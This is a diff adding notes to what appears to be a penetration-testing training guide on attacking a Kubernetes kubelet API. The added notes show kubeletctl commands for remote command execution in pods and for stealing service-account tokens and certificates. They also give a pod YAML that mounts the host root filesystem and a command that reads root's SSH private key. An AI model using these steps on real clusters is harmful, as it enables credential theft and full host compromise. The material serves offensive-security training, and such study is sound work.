@@ -108,4 +108,83 @@ curl https://10.129.10.11:10250/pods -k | jq .
 kubeletctl -i --server 10.129.10.11 pods
 ```
 
+To effectively interact with pods within the Kubernetes environment, it's important to have a clear understanding of the available commands. One approach that can be particularly useful is utilizing the `scan rce` command in `kubeletctl`. This command provides valuable insights and allows for efficient management of pods.
+
+#### Kubelet API - Available Commands
+
+```shell
+kubeletctl -i --server 10.129.10.11 scan rce
+```
+
+#### Kubelet API - Executing Commands
+
+```shell
+kubeletctl -i --server 10.129.10.11 exec "id" -p nginx -c nginx
+```
+
+---
+## Privilege Escalation
+
+To gain higher privileges and access the host system, we can utilize a tool called [kubeletctl](https://github.com/cyberark/kubeletctl) to obtain the Kubernetes service account's `token` and `certificate` (`ca.crt`) from the server. To do this, we must provide the server's IP address, namespace, and target pod. In case we get this token and certificate, we can elevate our privileges even more, move horizontally throughout the cluster, or gain access to additional pods and resources.
+#### Kubelet API - Extracting Tokens
+```shell
+kubeletctl -i --server 10.129.10.11 exec "cat /var/run/secrets/kubernetes.io/serviceaccount/token" -p nginx -c nginx | tee -a k8.token
+```
+
+#### Kubelet API - Extracting Certificates
+
+```shell
+kubeletctl --server 10.129.10.11 exec "cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt" -p nginx -c nginx | tee -a ca.crt
+```
+
+Now that we have both the `token` and `certificate`, we can check the access rights in the Kubernetes cluster. This is commonly used for auditing and verification to guarantee that users have the correct level of access and are not given more privileges than they need. However, we can use it for our purposes and we can inquire of K8s whether we have permission to perform different actions on various resources.
+
+#### List Privileges
+
+```shell
+export token=`cat k8.token`
+kubectl --token=$token --certificate-authority=ca.crt --server=https://10.129.10.11:6443 auth can-i --list
+```
+
+#### Pod YAML
+
+```yaml
+apiVersion: v1
+kind: Pod
+metadata:
+  name: privesc
+  namespace: default
+spec:
+  containers:
+  - name: privesc
+    image: nginx:1.14.2
+    volumeMounts:
+    - mountPath: /root
+      name: mount-root-into-mnt
+  volumes:
+  - name: mount-root-into-mnt
+    hostPath:
+       path: /
+  automountServiceAccountToken: true
+  hostNetwork: true
+```
+
+#### Creating a new Pod
+
+```shell
+kubectl --token=$token --certificate-authority=ca.crt --server=https://10.129.96.98:6443 apply -f privesc.yaml
+```
+
+```shell
+kubectl --token=$token --certificate-authority=ca.crt --server=https://10.129.96.98:6443 get pods
+```
+
+#### Extracting Root's SSH Key
+
+```shell
+kubeletctl --server 10.129.10.11 exec "cat /root/root/.ssh/id_rsa" -p privesc -c privesc
+```
+
+
+
 
